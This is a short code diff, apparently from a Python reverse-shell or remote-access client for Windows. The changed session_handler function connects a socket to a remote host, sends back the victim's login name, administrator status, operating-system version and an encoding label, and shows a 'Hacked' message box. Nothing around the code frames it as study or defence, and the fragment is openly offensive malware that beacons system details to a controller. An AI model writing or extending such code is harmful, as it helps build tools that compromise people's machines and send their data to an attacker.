@@ -38,13 +38,16 @@ def connection():
 
 def session_handler():
     try:
-        connection()
+        print(f'[+] Connection to {host_ip}')
+        sock.connect((host_ip, host_port))
+        encryption_type = "Base64"
         outbound(os.getlogin())
         outbound(ctypes.windll.shell32.IsUserAnAdmin)
         time.sleep(1)
         op_sys = platform.uname()
         op_sys = (f'{op_sys[0]} {op_sys[2]}')
         outbound(op_sys)
+        outbound(encryption_type)
         ctypes.windll.user32.MessageBoxW(0, "Hacked", "LOLOL", 1)
 
         print(f'[+] Connected to {host_ip}')
